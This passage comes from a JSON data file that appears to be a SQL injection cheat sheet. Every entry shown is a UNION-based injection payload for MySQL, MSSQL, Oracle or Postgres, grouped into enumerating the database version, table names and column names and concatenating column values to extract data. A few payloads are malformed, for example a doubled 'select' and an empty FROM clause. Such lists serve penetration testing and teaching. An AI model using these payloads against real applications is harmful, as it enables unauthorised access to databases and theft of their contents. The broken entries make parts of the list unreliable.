            ]
        },
        {
            "title": "Database enumeration",
            "items": [
                { "subtitle": "MySQL/MSSQL", "content": "' UNION SELECT @@version -- -" },
                { "subtitle": "Oracle", "content": "' UNION SELECT banner from v$version -- -" },
                { "subtitle": "Oracle(2nd method)", "content": "' UNION SELECT version from v$instance -- -" },
                { "subtitle": "Postgres", "content": "' UNION SELECT version() -- -" }
            ]
        },
        {
            "title": "Tablename enumeration",
            "items": [
                { "subtitle": "MySQL/MSSQL/Postgres", "content": "' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -" },
                { "subtitle": "Oracle", "content": "' UNION SELECT table_name,NULL FROM all_tables  -- -" }
            ]
        },
        {
            "title": "Column name enumeration",
            "items": [
                { "subtitle": "MySQL/MSSQL/Postgres", "content": "' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name=\"X\" -- -" },
                { "subtitle": "Oracle", "content": "' UNION SELECT column_name,NULL FROM all_tab_columns where table_name=\"X\"  -- -" }
            ]
        },
        {
            "title": "Column values concatenation",
            "items": [
                { "subtitle": "MySQL/Postgres", "content": "' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -" },
                { "subtitle": "MySQL(2nd method)", "content": "' UNION SELECT col1 ':' col2 from table_name limit 1 -- -" },
                { "subtitle": "Oracle / Postgres", "content": "' UNION SELECT select col1 ||':'||col2, null FROM  where table_name=\"X\"  -- -" },
                { "subtitle": "MSSQL", "content": "' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -" }
            ]
        },
        {
            "title": "Conditional ( Error Based )",
